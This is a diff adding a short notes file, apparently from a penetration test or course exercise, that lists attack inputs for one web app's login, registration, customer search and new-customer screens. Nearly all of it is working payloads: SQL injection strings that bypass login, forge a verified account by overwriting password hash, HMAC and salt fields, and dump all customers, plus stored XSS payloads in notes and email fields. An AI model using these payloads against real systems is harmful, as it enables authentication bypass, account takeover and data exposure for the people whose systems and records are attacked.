@@ -1,0 +1,46 @@
+
+Login Screen:
+insert in the user cell password need to be fiil with something(need to be at least one user alrady in the Database)
+
+'OR '1'='1' -- 
+
+*****************************************************************************************
+
+Register Screen:
+In email field 
+Need to insert all the other cells with values(to pass the frontend check)
+
+attacker@example.com', 
+is_verified=1, 
+is_active=1, 
+password_fp = '140b817768c9b148b384a16eb1c916f05bc4b62163807d26d902b1dab400e616',
+password_hmac='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 
+salt=UNHEX('00000000000000000000000000000000') 
+-- 
+
+In login page in user cell
+attacker@example.com' -- 
+
+******************************************************************************************
+
+Costumer search on Dashboard Screen
+
+' OR 1=1 -- 
+
+*******************************************************************************************
+
+
+New Costumer Screen
+
+XSS in notes (need to fill others the name cell)
+<img src=x onerror=alert(1)>
+
+
+SOLi+ XSS in email cell(need to fill name field)
+x@x.com', phone='pwn', notes='<img src=x onerror=alert(1)>' -- 
+
+
+
+
+
+
